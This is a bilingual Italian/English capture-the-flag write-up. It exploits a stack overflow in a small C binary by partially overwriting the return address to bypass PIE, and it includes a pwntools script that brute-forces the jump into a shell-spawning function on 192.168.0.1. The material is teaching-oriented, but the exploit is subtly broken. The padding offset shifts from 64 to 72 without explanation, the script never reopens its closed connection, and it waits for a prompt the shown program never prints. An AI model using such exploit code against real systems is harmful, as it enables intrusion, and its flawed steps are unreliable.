# winny-the-m0nke 2

## The program

</div>

```c
void winni_the_poooh() {
    puts("You got me again :/");
    __asm__("pop %r10");     // aggiusta l'allineamento dello stack prima di system
    system("/bin/sh");
}

void randy_smashy() {
    char smashy_randy[56];
    puts("Give me an hug.");
    read(0, smashy_randy, 256);   // 56 byte di buffer, 256 letti => overflow
}

int main() { randy_smashy(); }
```

```zsh
~/Downloads ❯ checksec winnieM0nke2
    Arch:       amd64-64-little
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

<div class="lang-it" markdown="1">
`read(0, smashy_randy, 256)` su un buffer da 56 byte è un overflow lineare da manuale, e non c'è canary. C'è però **PIE**: non conosciamo l'indirizzo di `winni_the_poooh`.

## La vulnerabilità e l'idea

Con PIE gli indirizzi del codice sono randomizzati, ma **non completamente**: la randomizzazione avviene a granularità di pagina (0x1000). Questo significa che i **12 bit bassi** dell'indirizzo (le ultime 3 nibble esadecimali) sono **costanti** rispetto al binario, e solo i bit più alti variano.

L'offset per arrivare al return address è `56 (buffer) + 8 (rbp saved) = 64`, quindi 72 byte prima di sovrascrivere il RIP... in realtà con l'allineamento dello stack scritto in questa build il padding è di 72 byte. Facciamo un **partial overwrite**: sovrascriviamo solo i 2 byte bassi del return address con quelli di `winni_the_poooh`. Di questi 16 bit, i 12 bit bassi sono fissi e noti dal binario; ci restano solo **4 bit da indovinare** (mezzo byte), cioè 1 possibilità su 16.

## L'exploit

Nel nostro caso i byte bassi target sono `\x89` (fisso) e `\xb1` (dove il nibble alto è quello da bruteforzare). Riproviamo la connessione finché il partial overwrite non centra la pagina giusta e otteniamo `You got me again :/` — segnale che siamo saltati nella win function.

</div>

<div class="lang-en" markdown="1">
`read(0, smashy_randy, 256)` on a 56-byte buffer is a textbook linear overflow, and there's no canary. But there **is** PIE: we don't know the address of `winni_the_poooh`.

## The vulnerability and the idea

With PIE, code addresses are randomized, but **not entirely**: randomization happens at page granularity (0x1000). That means the **low 12 bits** of an address (the last 3 hex nibbles) are **constant** relative to the binary, and only the higher bits change.

The offset to reach the return address is `56 (buffer) + 8 (saved rbp)`, and with this build's stack alignment the padding works out to 72 bytes before we overwrite RIP. We do a **partial overwrite**: we overwrite only the low 2 bytes of the return address with those of `winni_the_poooh`. Of those 16 bits, the low 12 are fixed and known from the binary; we only have **4 bits to guess** (half a byte), i.e. 1 in 16.

## The exploit

In our case the target low bytes are `\x89` (fixed) and `\xb1` (whose high nibble is the one we brute force). We keep reconnecting until the partial overwrite lands on the right page and we get `You got me again :/` — the sign that we jumped into the win function.

</div>

```python
from pwn import *

i = 0
p = remote('192.168.0.1', 1239)
while True:
    log.info(f"Try : {i}")
    # 72 byte di padding + partial overwrite del return address (2 byte bassi)
    p.send(b"A"*72 + p8(0x89) + p8(0xb1))
    p.recvuntil(b"careful.\n")
    try:
        line = p.recvline()
        if b"again :/" in line:      # siamo saltati in winni_the_poooh
            p.interactive()
            break
        p.close()
    except:
        p.close()
    i += 1
```

<div class="lang-it" markdown="1">
Un brute force da ~1/16 significa che in media bastano una manciata di tentativi. Rispetto alla versione 1 (senza PIE, in cui l'indirizzo di win era hardcodato), qui tutta la difficoltà sta nel capire che il partial overwrite riduce l'entropia da 64 bit a soli 4.
